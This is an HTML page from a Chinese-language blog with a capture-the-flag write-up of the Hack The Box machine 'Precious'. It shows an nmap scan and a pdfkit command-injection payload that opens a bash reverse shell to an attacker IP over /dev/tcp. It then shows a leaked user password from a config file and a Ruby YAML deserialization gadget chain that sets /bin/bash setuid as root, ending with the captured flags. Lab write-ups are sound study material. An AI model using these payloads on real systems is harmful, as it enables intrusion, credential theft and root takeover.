@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Precious - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Precious靶场信息  靶场类型  信息收集Nmap┌──(root㉿kali)-[~&#x2F;Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.189 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-12-31 20:35 EST Nmap scan r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Precious - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Precious靶场信息  靶场类型  信息收集Nmap┌──(root㉿kali)-[~&#x2F;Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.189 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-12-31 20:35 EST Nmap scan r">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/SXO6XJBr5ubR5mDW_Tg1EF7_AvGQ7AN6uk36u2mK6U0.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/7qptmzhy7gnR3SulQNc5wXHHdbX5mAXwTIdg_y_YUHg.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/yU0h4je2sQ4u_xq4_XsMc4kOm6jFsan6axVWrw012DI.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/ESUUrIl3cFliJnYLguZJNWDl3uHLwGqeoqyN8DQE9i4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/Htm0c_q1alaWKKxMliXq3Q3Y73S5wgmVoD7gIlWOm68.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/GEzZ9J3zDYgiMN6yV8kJ4Ws-GsRxaswc_eaxkncWUdY.png">
+<meta property="article:published_time" content="2022-11-26T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-17T02:23:59.798Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/SXO6XJBr5ubR5mDW_Tg1EF7_AvGQ7AN6uk36u2mK6U0.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Precious - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Precious - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-11-26T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-11-26
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Precious"><span class="post-toc-text">Hackthebox - Precious</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#User"><span class="post-toc-text">User</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Root"><span class="post-toc-text">Root</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Easy/Hackthebox-Precious"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Precious - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-11-26 19:38:36" datetime="2022-11-26T11:38:36.000Z"  itemprop="datePublished">2022-11-26</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Precious"><a href="#Hackthebox-Precious" class="headerlink" title="Hackthebox - Precious"></a>Hackthebox - Precious</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/SXO6XJBr5ubR5mDW_Tg1EF7_AvGQ7AN6uk36u2mK6U0.png" class title="image">
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/7qptmzhy7gnR3SulQNc5wXHHdbX5mAXwTIdg_y_YUHg.png" class title="image">
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.189
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-31 20:35 EST
+Nmap scan report for 10.10.11.189
+Host is up (0.26s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
+|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
+|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://precious.htb/
+|_http-server-header: nginx/1.18.0
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=12/31%OT=22%CT=1%CU=35049%PV=Y%DS=2%DC=T%G=Y%TM=63B0E3
+OS:93%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OP
+OS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST
+OS:11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
+OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+OS:D=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 21/tcp)
+HOP RTT       ADDRESS
+1   264.06 ms 10.10.14.1
+2   264.51 ms 10.10.11.189
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 46.32 seconds
+</code></pre>
+<p>增加一个 hosts 解析</p>
+<pre><code class="bash">echo 10.10.11.189 precious.htb &gt;&gt; /etc/hosts
+</code></pre>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/yU0h4je2sQ4u_xq4_XsMc4kOm6jFsan6axVWrw012DI.png" class title="image">
+
+<p>首页就一个功能，将网页转换为 PDF</p>
+<img src="/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/ESUUrIl3cFliJnYLguZJNWDl3uHLwGqeoqyN8DQE9i4.png" class title="image">
+
+<p>提示无法加载远程 URL，尝试一下本地</p>
+<img src="/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/Htm0c_q1alaWKKxMliXq3Q3Y73S5wgmVoD7gIlWOm68.png" class title="image">
+
+<p>这里使用 127.0.0.1 和 localhost 都不行，我们本地开一个 http 服务看看是否有请求</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# python3 -m http.server 80                                
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# python3 -m http.server 80                                
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.189 - - [31/Dec/2022 20:41:39] &quot;GET / HTTP/1.1&quot; 200 -
+</code></pre>
+<img src="/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/GEzZ9J3zDYgiMN6yV8kJ4Ws-GsRxaswc_eaxkncWUdY.png" class title="image">
+
+<p>确实是有请求，并且成功转换为 pdf文件</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Downloads]
+└─# exiftool ylm4oxm111sk45cwb57jmfctpy0epjfq.pdf 
+ExifTool Version Number         : 12.49
+File Name                       : ylm4oxm111sk45cwb57jmfctpy0epjfq.pdf
+Directory                       : .
+File Size                       : 19 kB
+File Modification Date/Time     : 2022:12:31 20:41:41-05:00
+File Access Date/Time           : 2022:12:31 20:42:00-05:00
+File Inode Change Date/Time     : 2022:12:31 20:41:42-05:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.4
+Linearized                      : No
+Page Count                      : 1
+Creator                         : Generated by pdfkit v0.8.6
+</code></pre>
+<p>这里可以看到生成的工具是 pdfkit 0.8.6</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><blockquote>
+<p><a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795" target="_blank" rel="noopener">https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795</a></p>
+</blockquote>
+<blockquote>
+<p><a href="https://www.ctfiot.com/84447.html" target="_blank" rel="noopener">https://www.ctfiot.com/84447.html</a></p>
+</blockquote>
+<blockquote>
+<p>找到了两份参考文档</p>
+</blockquote>
+<p>首先创建一个 payload</p>
+<pre><code class="bash">http://example.com/?name=%20`bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.10.14.84/4444 &lt;&amp;1&#39;`
+</code></pre>
+<p>然后使用 nc 监听一个端口</p>
+<pre><code class="bash">nc -nvlp 4444
+</code></pre>
+<p>然后去请求我们的 payload</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.84] from (UNKNOWN) [10.10.11.189] 40412
+bash: cannot set terminal process group (678): Inappropriate ioctl for device
+bash: no job control in this shell
+ruby@precious:/var/www/pdfapp$ whoami&amp;&amp;id
+whoami&amp;&amp;id
+ruby
+uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
+</code></pre>
+<p>成功反弹回 shell</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><pre><code class="bash">ruby@precious:~/.bundle$ pwd    
+pwd
+/home/ruby/.bundle
+ruby@precious:~/.bundle$ cat config
+cat config
+---
+BUNDLE_HTTPS://RUBYGEMS__ORG/: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot;
+</code></pre>
+<p>在 &#x2F;home&#x2F;ruby&#x2F;.bundle 中有一个 config 文件，里面似乎是 henry 用户的密码</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ssh henry@10.10.11.189  
+The authenticity of host &#39;10.10.11.189 (10.10.11.189)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:1WpIxI8qwKmYSRdGtCjweUByFzcn0MSpKgv+AwWRLkU.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.11.189&#39; (ED25519) to the list of known hosts.
+henry@10.10.11.189&#39;s password: 
+Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Dec 31 18:20:32 2022 from 10.10.14.78
+henry@precious:~$ whoami&amp;&amp;id
+henry
+uid=1000(henry) gid=1000(henry) groups=1000(henry)
+</code></pre>
+<p>成功拿到 user 权限</p>
+<pre><code class="bash">henry@precious:~$ cat user.txt 
+415eb4be868d88438bda7f02ce8528f1
+</code></pre>
+<p>成功拿到 user 权限的 flag 文件</p>
+<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><pre><code class="bash">henry@precious:~$ sudo -l
+Matching Defaults entries for henry on precious:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User henry may run the following commands on precious:
+    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+</code></pre>
+<p>我们可以使用 root 权限利用 ruby 执行 &#x2F;opt&#x2F;update_dependencies.rb</p>
+<pre><code class="ruby">henry@precious:~$ cat /opt/update_dependencies.rb
+# Compare installed dependencies with those specified in &quot;dependencies.yml&quot;
+require &quot;yaml&quot;
+require &#39;rubygems&#39;
+
+# TODO: update versions automatically
+def update_gems()
+end
+
+def list_from_file
+    YAML.load(File.read(&quot;dependencies.yml&quot;))
+end
+
+def list_local_gems
+    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
+end
+
+gems_file = list_from_file
+gems_local = list_local_gems
+
+gems_file.each do |file_name, file_version|
+    gems_local.each do |local_name, local_version|
+        if(file_name == local_name)
+            if(file_version != local_version)
+                puts &quot;Installed version differs from the one specified in file: &quot; + local_name
+            else
+                puts &quot;Installed version is equals to the one specified in file: &quot; + local_name
+            end
+        end
+    end
+end
+</code></pre>
+<p>这里看到，这里使用了容易受到反序列化攻击的 YAML</p>
+<blockquote>
+<p><a href="https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/" target="_blank" rel="noopener">https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/</a></p>
+</blockquote>
+<p>这里找到了一份参考文档</p>
+<pre><code class="bash">---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &amp;1 !ruby/object:Net::BufferedIO
+      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: &quot;abc&quot;
+      debug_output: &amp;1 !ruby/object:Net::WriteAdapter
+         socket: &amp;1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module &#39;Kernel&#39;
+                 method_id: :system
+             git_set: id
+         method_id: :resolve
+</code></pre>
+<p>将上面的内容保存为 dependencies.yml</p>
+<p>然后去运行</p>
+<pre><code class="bash">henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
+sh: 1: reading: not found
+uid=0(root) gid=0(root) groups=0(root)
+Traceback (most recent call last):
+        33: from /opt/update_dependencies.rb:17:in `&lt;main&gt;&#39;
+        32: from /opt/update_dependencies.rb:10:in `list_from_file&#39;
+        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load&#39;
+        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby&#39;
+        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39;
+        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39;
+        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39;
+        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document&#39;
+        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39;
+        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39;
+        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39;
+        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence&#39;
+        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty&#39;
+        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each&#39;
+        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty&#39;
+        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39;
+        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39;
+        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39;
+        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping&#39;
+        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive&#39;
+        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with&#39;
+        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with&#39;
+        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize&#39;
+        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements&#39;
+         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each&#39;
+         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from&#39;
+         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read&#39;
+         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG&#39;
+         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;&#39;
+         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&#39;
+         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve&#39;
+         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;&#39;
+         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&#39;
+/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system&#39;: no implicit conversion of nil into String (TypeError)
+</code></pre>
+<p>执行成功了，然后我们修改一下代码</p>
+<pre><code class="bash">---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &amp;1 !ruby/object:Net::BufferedIO
+      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: &quot;abc&quot;
+      debug_output: &amp;1 !ruby/object:Net::WriteAdapter
+         socket: &amp;1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module &#39;Kernel&#39;
+                 method_id: :system
+             git_set: chmod +s /bin/bash
+         method_id: :resolve
+</code></pre>
+<pre><code class="bash">henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
+sh: 1: reading: not found
+Traceback (most recent call last):
+        33: from /opt/update_dependencies.rb:17:in `&lt;main&gt;&#39;
+        32: from /opt/update_dependencies.rb:10:in `list_from_file&#39;
+        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load&#39;
+        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby&#39;
+        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39;
+        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39;
+        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39;
+        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document&#39;
+        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39;
+        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39;
+        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39;
+        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence&#39;
+        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty&#39;
+        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each&#39;
+        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty&#39;
+        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39;
+        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39;
+        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39;
+        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping&#39;
+        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive&#39;
+        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with&#39;
+        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with&#39;
+        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize&#39;
+        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements&#39;
+         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each&#39;
+         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from&#39;
+         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read&#39;
+         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG&#39;
+         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;&#39;
+         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&#39;
+         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve&#39;
+         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;&#39;
+         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&#39;
+/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system&#39;: no implicit conversion of nil into String (TypeError)
+henry@precious:~$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+</code></pre>
+<p>ok，执行成功，现在去完成提权吧</p>
+<pre><code class="bash">henry@precious:~$ /bin/bash -p
+bash-5.1# whoami&amp;&amp;id
+root
+uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry)
+</code></pre>
+<p>成功提权到 root 用户</p>
+<pre><code class="bash">bash-5.1# cat /root/root.txt
+a8ac857576f35e2c14a259a4e77bfe55
+</code></pre>
+<p>成功拿到 root 权限的 flag 文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/&title=《Precious - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/&title=《Precious - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
